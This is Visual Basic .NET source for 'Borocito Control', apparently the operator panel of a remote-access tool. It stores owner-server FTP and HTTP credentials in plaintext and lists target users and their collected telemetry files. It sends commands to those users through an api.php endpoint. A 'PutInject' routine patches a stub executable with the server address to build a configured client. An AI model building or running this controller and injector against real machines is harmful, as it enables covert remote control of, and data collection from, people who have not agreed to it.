Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\Control"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public HttpOwnerServer As String
    Public HostOwnerServer As String
    Public HostOwnerServerUser As String
    Public HostOwnerServerPassword As String
    Public userTarget As String
    Public userIDTarget As String
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
    Public OwnerServer As String
    Public isThemeActive As Boolean = False
    Public isPortable As Boolean = False
    Public CommandRefreshDelay As Integer = 10000
    Public isMultiSelectMode As Boolean = False
    Public compileVersion As String = My.Application.Info.Version.ToString &
    " (" & Application.ProductVersion & ") " &
    "[22/04/2023 12:18]" 'Indicacion exacta de la ultima compilacion
End Module
Module Utility
    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
            Return finalContent & "[" & from & "]" & content
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
            Return "[AddToLog@Utility]Error: " & ex.Message
        End Try
    End Function
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
    Sub PutInject(ByVal injectContent As String, ByVal inFilePath As String, ByVal outFilePath As String)
        Try
            If My.Computer.FileSystem.FileExists(outFilePath) Then
                My.Computer.FileSystem.DeleteFile(outFilePath)
            End If
            Dim stub As String
            Const FS1 As String = "|BRO|"
            Dim Temp As String = outFilePath
            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(inFilePath)
            File.WriteAllBytes(Temp, bytesEXE)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & FS1 & injectContent & FS1)
            FileClose(1)
            MsgBox("Servidor inyectado correctamente.", MsgBoxStyle.Information, "Injector")
        Catch ex As Exception
            AddToLog("PutInject@Utility", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Settings
    Sub SetData()
        Try
            If Not isPortable Then
                Dim OwnerServerInput = InputBox("Ingrese la direccion del servidor", "Servidor", "http://")
                If OwnerServerInput <> Nothing Then
                    Dim httpPrefix As String = Nothing
                    If OwnerServerInput.StartsWith("https") Then
                        httpPrefix = "https://"
                    ElseIf OwnerServerInput.StartsWith("http") Then
                        httpPrefix = "http://"
                    End If
                    OwnerServer = OwnerServerInput.Replace(httpPrefix, Nothing)
                    HttpOwnerServer = OwnerServerInput
                End If
                Dim HostOwnerServerInput = InputBox("Ingrese la direccion host del servidor", "Servidor", "ftp://" & OwnerServerInput)
                If HostOwnerServerInput <> Nothing Then
                    HostOwnerServer = HostOwnerServerInput
                End If
                Dim HostOwnerServerUserInput = InputBox("Ingrese el usuario del servidor", "Servidor")
                If HostOwnerServerUserInput <> Nothing Then
                    HostOwnerServerUser = HostOwnerServerUserInput
                End If
                Dim HostOwnerServerPasswordInput = InputBox("Ingrese la contraseña del servidor", "Servidor")
                If HostOwnerServerPasswordInput <> Nothing Then
                    HostOwnerServerPassword = HostOwnerServerPasswordInput
                End If
            End If
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("SetData@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            If Not isPortable Then
                OwnerServer = regKey.GetValue("OwnerServer")
                HttpOwnerServer = regKey.GetValue("HttpOwnerServer")
                HostOwnerServer = regKey.GetValue("HostOwnerServer")
                HostOwnerServerUser = regKey.GetValue("HostOwnerServerUser")
                HostOwnerServerPassword = regKey.GetValue("HostOwnerServerPassword")
                isThemeActive = regKey.GetValue("isThemeActive")
                CommandRefreshDelay = regKey.GetValue("CommandRefreshDelay")
            Else
                LoadPortable()
            End If
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("LoadRegedit@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SaveRegedit()
        Try
            If Not isPortable Then
                regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
                regKey.SetValue("HttpOwnerServer", HttpOwnerServer, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServer", HostOwnerServer, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServerUser", HostOwnerServerUser, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServerPassword", HostOwnerServerPassword, RegistryValueKind.String)
                regKey.SetValue("isThemeActive", isThemeActive, RegistryValueKind.String)
                regKey.SetValue("CommandRefreshDelay", CommandRefreshDelay, RegistryValueKind.String)
            End If
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("Init@Settings", "Error: " & ex.Message, True)
        End Try
        LoadRegedit()
    End Sub
    Sub LoadPortable()
        Try
            Dim configFile As String = Application.StartupPath & "\" & My.Application.Info.AssemblyName & ".ini"
            OwnerServer = GetIniValue("SERVER", "OwnerServer", configFile)
            HttpOwnerServer = GetIniValue("SERVER", "HttpOwnerServer", configFile)
            HostOwnerServer = GetIniValue("SERVER", "HostOwnerServer", configFile)
            HostOwnerServerUser = GetIniValue("SERVER", "HostOwnerServerUser", configFile)
            HostOwnerServerPassword = GetIniValue("SERVER", "HostOwnerServerPassword", configFile)
            isThemeActive = GetIniValue("SERVER", "isThemeActive", configFile)
            CommandRefreshDelay = GetIniValue("SERVER", "CommandRefreshDelay", configFile)

            DIRCommons = Application.StartupPath & "\" & My.Application.Info.AssemblyName
            DIRTemp = DIRCommons
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("LoadPortable@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        Try
            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
            'Ver si es la primera vez
            If AlreadyExist() Then
                'Carga los datos
                LoadRegedit()
            Else
                If Not isPortable Then
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\Control")
                    regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
                    'Pregunta por datos
                    SetData()
                    'Guardar los datos
                    SaveRegedit()
                Else
                    MsgBox("Este Panel de Control no esta configurado", MsgBoxStyle.Critical, "Configuracion Portable")
                    End
                End If
            End If
            'Indexar la lista de comandos
            IndexTheCommands()
            'Obtener lista usuarios
            Main.IndexUsersToPanel()
            'Obtener lista telemetria
            Main.IndexTelemetryToPanel()
            'Obtener lista archivos
            Main.IndexTelemetryFilesToPanel()
            'Obtener los archivos de configuracion del servidor
            GetGlobalsConfig()
            GetBoroGetConfig()
            'Aplicando variables
            Main.Connected_Label.Text = "Conectado a: " & OwnerServer
            Main.Version_Label.Text = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " for " & GetIniValue("Assembly", "Name", DIRCommons & "\Globals.ini") & " v" & My.Application.Info.Version.ToString & " (" & GetIniValue("Assembly", "Version", DIRCommons & "\Globals.ini") & ")"
            Main.Main_Inject_TextBox.Text = HttpOwnerServer
            Main.Busy_Panel.Visible = False
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function AlreadyExist() As Boolean
        Try
            If regKey Is Nothing Then
                Return False
            Else
                Return True
            End If
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("Init@StartUp", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
    Sub IndexTheCommands()
        Try
            Main.Main_Users_Command_ComboBox.AutoCompleteCustomSource.Clear()
            Main.Main_Users_Command_ComboBox.Items.Clear()
            If My.Computer.FileSystem.FileExists(DIRCommons & "\CommandList.txt") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\CommandList.txt")
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\CommandList.txt", My.Resources.Comandos, False)
            For Each linea As String In IO.File.ReadLines(DIRCommons & "\CommandList.txt")
                If linea.StartsWith("#") = False Then
                    Main.Main_Users_Command_ComboBox.AutoCompleteCustomSource.Add(linea)
                    Main.Main_Users_Command_ComboBox.Items.Add(linea)
                End If
            Next
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("IndexTheCommands@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower = "/portable" Then
                    isPortable = True
                End If

            End If
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Enum API_TYPES
        PING
        COMMAND
        TELEMETRY
        USER_REPORT
    End Enum
    Sub GetGlobalsConfig()
        Try
            Dim LocalFilePath As String = DIRCommons & "\Globals.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/Globals.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.Network.DownloadFile(RemoteFilePath, LocalFilePath)
            Main.Main_General_Globals_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalFilePath)
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("GetGlobalsConfig@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetBoroGetConfig()
        Try
            Dim LocalFilePath As String = DIRCommons & "\BoroGet_config.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/Boro-Get/config.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.Network.DownloadFile(RemoteFilePath, LocalFilePath)
            Main.Main_General_BoroGet_Config_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalFilePath)
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("GetBoroGetConfig(config)@Network", "Error: " & ex.Message, True)
        End Try
        Try
            Dim LocalFilePath As String = DIRCommons & "\BoroGet_Repositories.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/Boro-Get/Repositories.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.Network.DownloadFile(RemoteFilePath, LocalFilePath)
            Main.Main_General_BoroGet_Repositories_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalFilePath)
        Catch ex As Exception
            Main.Status_Label.Text = AddToLog("GetBoroGetConfig(Repositories)@Network", "Error: " & ex.Message, True)
        End Try
    End Sub

    Function SendAPIRequest(ByVal clase As API_TYPES, ByVal UID As String, ByVal content As String) As Boolean
        Try

            Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
            content = content.Replace("&", "{ampersand}")
            content = content.Replace("?", "{questionmark}")
            Dim postData As String = "content=" & content
            request.ContentType = "application/x-www-form-urlencoded"
            request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
            request.Method = "POST"
            request.Headers("ident") = UID
            request.Headers("class") = clase.ToString

            Dim dataStream As New StreamWriter(request.GetRequestStream())
            dataStream.Write(postData)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            'AddToLog("Network", "Response for '" & CStr(clase.ToString) & "': " & CType(response, HttpWebResponse).StatusCode & " " & CType(response, HttpWebResponse).StatusDescription, False)
            response.Close()

            Return True
        Catch ex As Exception
            AddToLog("SendAPIRequest@Network", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
    Function ReceiveAPIRequest(ByVal clase As API_TYPES, ByVal UID As String) As String
        Try

            Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
            request.ContentType = "application/x-www-form-urlencoded"
            request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
            request.Method = "GET"
            request.Headers("ident") = UID
            request.Headers("class") = clase.ToString

            Dim response As WebResponse = request.GetResponse()
            Dim dataReader As New StreamReader(response.GetResponseStream())
            Dim respuesta As String = dataReader.ReadToEnd()

            response.Close()
            dataReader.Close()

            Return respuesta
        Catch ex As Exception
            AddToLog("ReceiveAPIRequest@Network", "Error: " & ex.Message, True)
            Return Nothing
        End Try
    End Function
End Module
